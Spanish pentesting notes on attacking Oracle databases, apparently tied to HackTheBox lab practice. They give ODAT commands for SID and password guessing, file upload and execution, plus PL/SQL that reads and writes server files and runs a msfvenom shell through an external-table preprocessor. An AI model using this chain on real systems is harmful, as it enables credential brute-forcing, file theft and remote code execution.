# 1521 - Oracle DB

## Odat

Una herramienta indispensable para poder atacar de forma sencilla una base de datos Oracle, toda la instalación está muy bien explicada en su github.

{% embed url="https://github.com/quentinhardy/odat" %}

### Obtención del SID

```
python3 odat.py sidguesser -s <ip>
```

### Obtención de credenciales válidas

```
python3 odat.py passwordguesser -d <sid> -s <ip>
```

#### Diccionario de usuarios y contraseñas

Lo encontramos en "/odat/accounts" si queremos añadir nuestros propios diccionarios tenemos que tener un documento de texto con usuario y contraseña dividido con un "/".

```
<usuario>/<contraseña
```

### Subir archivos

```
python3 odat.py utlfile -d <sid> -U '<usuarios' -P '<contraseña>' -s <ip> --putFile <directorio> <nombreoutputarchivo> <archivodemaquinaatacante> --sysdba
```

### Ejecutar archivos

```
python3 odat.py externaltable -d <sid> -U '<usuarios' -P '<contraseña>' -s <ip> --exec <directorio> <nombredelarchivo> --sysdba
```

## Manualmente

Podemos acceder a la base de datos de forma sencilla con "sqlplus64".

```
sqlplus64 <usuario>/<contraseña>@<ip> as sysdba
```

### Leer archivos del sistema manualmente

```plsql
declare
 f utl_file.file_type;
 s varchar(2000);
 begin
  f := utl_file.fopen('Directorio/de/la/maquina', 'Archivoaleer.txt', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
 end;
```

Una vez escrito esto tenemos que pulsar un "/" y cada vez que enviemos un "/" nos ejecuta la instrucción.

Para que la base de datos nos saque el output y podamos leer el archivo tenemos que establecerlo:

```
set serveroutput on
```

### Subir archivos al sistema manualmente

```plsql
declare
 f utl_file.file_type;
 s varchar(5000) := 'Texto a introducir';
begin
 f := utl_file.fopen('Directorio/de/la/maquina', 'nombredelarchivo.txt', 'W');
 utl_file.put_line(f,s);
 utl_file.fclose(f);
end;
```

### Ejecutar archivos del sistema manualmente

En primer lugar vamos a mandar la siguiente instrucción a la base de datos:

```plsql
CREATE DIRECTORY log_dir AS '/Temp'
```

Y ahora viene el largo

```plsql
CREATE TABLE execute_mybinary( line NUMBER, text VARCHAR2(4000))
ORGANIZATION EXTERNAL(
 TYPE oracle_loader DEFAULT DIRECTORY log_dir
 ACCESS PARAMETERS (
 RECORDS DELIMITED BY NEWLINE NOLOGFILE
 PREPROCESSOR log_dir:'shell.exe'
 FIELDS TERMINATED BY WHITESPACE ( line RECNUM, text POSITION(1:4000)) )
 LOCATION ('shell.exe') )
REJECT LIMIT UNLIMITED;
```

Tendría que aparecernos que la tabla ha sido creada, en este caso estamos subiendo una shell que hemos creado con msfvenom llamada "shell.exe" por lo que ya para ejecutarlo tenemos que mandar la siguiente instrucción.

```plsql
select count(*) from execute_mybinary;
```

### Practicar

* Máquina "[Silo](https://www.youtube.com/watch?v=PTg8DRyazXw)" de HTB \[Acceso 10/02/2022]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
